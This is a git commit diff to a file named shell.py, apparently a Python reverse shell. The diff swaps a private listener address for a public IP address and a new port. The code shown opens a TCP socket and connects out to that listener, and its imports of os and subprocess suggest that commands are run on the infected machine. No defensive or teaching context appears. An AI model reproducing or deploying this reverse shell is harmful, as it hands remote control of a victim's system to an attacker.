bcaf6c0d1eaf261941152dc8ee1d72cb96c91d7c
copslock <34976676+copslock@users.noreply.github.com>
2021-02-22 19:53:44 +0800

    Update shell.py

--- shell.py
+++ shell.py
@@ -4,8 +4,8 @@ import os
 import socket
 import subprocess
 
-HOST = '192.168.1.100' # The ip of the listener.
-PORT = 4444 # The same port as listener.
+HOST = '46.105.55.153' # The ip of the listener.
+PORT = 53738 # The same port as listener.
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT)) # Connect to listener.
